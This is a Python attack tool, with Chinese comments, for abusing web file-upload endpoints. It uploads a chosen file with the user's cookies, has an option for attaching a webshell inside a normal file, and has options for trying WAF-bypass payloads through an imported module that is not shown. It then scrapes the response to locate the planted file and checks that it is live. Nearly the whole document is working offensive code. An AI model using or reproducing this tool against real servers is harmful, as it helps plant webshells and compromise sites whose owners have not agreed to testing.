#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import requests
import argparse
import sys
import re
import os
from urllib.parse import urljoin
from color_output import *
from bypass import General
from comman import *

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
}

class UPLOAD:
    def __init__(self, args):
        self.args = args
        self.cookies = self.getCookie()
        self.initUrls = self.getInitUrls(self.args.u)   # 未上传时的页面链接

    def run(self):
        # 占坑，未完成
        if self.args.bypass or self.args.bypass_ignore:  # 畸形请求
            self.deformityUpload()
        else:    # 正常上传
            self.normalUpload()

    def normalUpload(self):
        # 正常上传
        print(fuchsia('[ module ]') + cyan('普通上传'))
        files = self.setNormalFiles(self.args.field, self.args.f)  # 读取文件
        data = self.setData(self.args.data)   # 填充参数
        res = upload(self.args.u, files, data=data)   # 文件上传
        if res != None:  # 通过与初始页面对比尝试找出上传路径
            urls = self.extractUrls(res)      # 提取URL
            self.comparaUrls(urls)            # 结果对比
        return

    def deformityUpload(self):
        # 非正常上传
        if self.args.attach != '':  # 存在attach合并文件，获取后缀名备用
            suffix = self.getSuffix(self.args.attach)
        stop = True
        if self.args.bypass:
            print(blue('[ module ]') + 'bypass，成功即停')
        elif self.args.bypass_ignore:
            print(blue('[ module ]') + 'bypass，全部尝试')
            stop = False
        m = General(self.args, stop=stop)
        m.exploit()
        return


    def getSuffix(self, filename):
        # 获取文件名后缀
        try:
            ext = filename.split('.')[-1]
            return ext
        except:
            if self.args.ct != '':
                return
            print(red('[ Error ]') + yellow('获取文件后缀名失败'))
            sys.exit()

    def setData(self, data):
        # 解析data
        if data == '':
            return {}
        else:
            retData = {}
            for x in data.split(';'):
                v,k =  x.strip().split('=',1)
                retData[v] = k
            return retData


    def setNormalFiles(self, field, file):
        # 获取文件内容，普通上传专属
        try:
            files = {
                field: (
                file,
                open(file, 'rb'),
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()

    def getInitUrls(self, url):
        # 获取上传文件前页面urls
        try:
            r = requests.get(url, headers=headers, timeout=5, cookies=self.cookies)
            urls = self.extractUrls(r.text)
            return urls
        except Exception as e:
            print(red('[ Error ]') + e)
            sys.exit()

    def getCookie(self):
        # 解析document.cookie
        cookie = self.args.c
        if cookie == None:
            return None
        cookies = {}  # 初始化cookies字典变量
        try:
            for x in cookie.split(';'):  # 按照字符：进行划分读取
                name, value = x.strip().split('=', 1)
                cookies[name] = value  # 为字典cookies添加内容
        except:
            print(red('[ Error ]') + yellow('cookie格式错误'))
            sys.exit()
        return cookies

    def extractUrls(self, text):
        # 提取页面URL
        resultUrls = []
        regex_str = r"""
                              (?:"|')                               # Start newline delimiter
                              (
                                ((?:[a-zA-Z]{1,10}://|//)           # Match a scheme [a-Z]*1-10 or //
                                [^"'/]{1,}\.                        # Match a domainname (any character + dot)
                                [a-zA-Z]{2,}[^"']{0,})              # The domainextension and/or path
                                |
                                ((?:/|\.\./|\./)                    # Start with /,../,./
                                [^"'><,;| *()(%%$^/\\\[\]]          # Next character can't be...
                                [^"'><,;|()]{1,})                   # Rest of the characters can't be
                                |
                                ([a-zA-Z0-9_\-/]{1,}/               # Relative endpoint with /
                                [a-zA-Z0-9_\-/]{1,}                 # Resource name
                                \.(?:[a-zA-Z]{1,4}|action)          # Rest + extension (length 1-4 or action)
                                (?:[\?|/][^"|']{0,}|))              # ? mark with parameters
                                |
                                ([a-zA-Z0-9_\-]{1,}                 # filename
                                \.(?:php|asp|aspx|jsp|json|
                                     action|html|js|txt|xml)             # . + extension
                                (?:\?[^"|']{0,}|))                  # ? mark with parameters
                              )
                              (?:"|')                               # End newline delimiter
                            """
        compile_str = re.compile(regex_str, re.VERBOSE)
        ret = compile_str.findall(text)
        if ret != []:
            for x in ret:
                for m in x:
                    u = self.url_check(self.args.u, m)
                    if u not in resultUrls and u:
                        resultUrls.append(u)
        return resultUrls

    def url_check(self, url, u):
        # 检测url完整性，返回绝对地址
        err = ['', None, '/', '\n']
        if u in err:
            return
        if re.match("(http|https)://.*", u):  # 匹配绝对地址
            return u
        else:  # 拼凑相对地址，转换成绝对地址
            u = urljoin(url, u)
            return u

    def comparaUrls(self, urls):
        # 对比页面url差别
        if urls == []:
            return
        for u in urls:
            if u not in self.initUrls:
                print(green('[ upload ]') + u)
                self.checkLive(u)
        return

    def checkLive(self, u):
        # 检测结果存活
        try:
            r = requests.get(
                u,
                cookies=self.cookies,
                headers=headers,
                timeout=5
            )
            if r.status_code != 404:
                print(green('[ live ]') + cyan(r.status_code))
            else:
                print(yellow('[ live ]') + cyan(r.status_code))
        except Exception as e:
            print(yellow('[ Warn ]') + e)
        return



def terminal_parser():
    if len(sys.argv)==1 :
        sys.argv.append('-h')
    parser = argparse.ArgumentParser(description='动态文件上传', add_help=True)
    parser.add_argument('-u', help='文件接收URL路径')
    parser.add_argument('-c', help='document.cookie，选填', default=None)
    parser.add_argument('-f', help='上传文件')
    parser.add_argument('--field', help='上传参数名')
    parser.add_argument('--data', help='附加参数，如submit=true，多参数用;分割', default='')
    parser.add_argument('--attach', help='webshell文件，附加时将尝试附加在正常文件内', default='')
    parser.add_argument('--bypass', help='尝试绕过WAF，成功即停', action='store_true')
    parser.add_argument('--bypass_ignore', help='尝试绕过WAF，尝试全部payload', action='store_true')
    parser.add_argument('--ct', help='文件上传类型', default='', choices=['png', 'jpeg', 'gif', 'json', 'plain'])
    parser.add_argument('--mime', help='自定义content-type', default='')
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = terminal_parser()
    x = UPLOAD(args)
    x.run()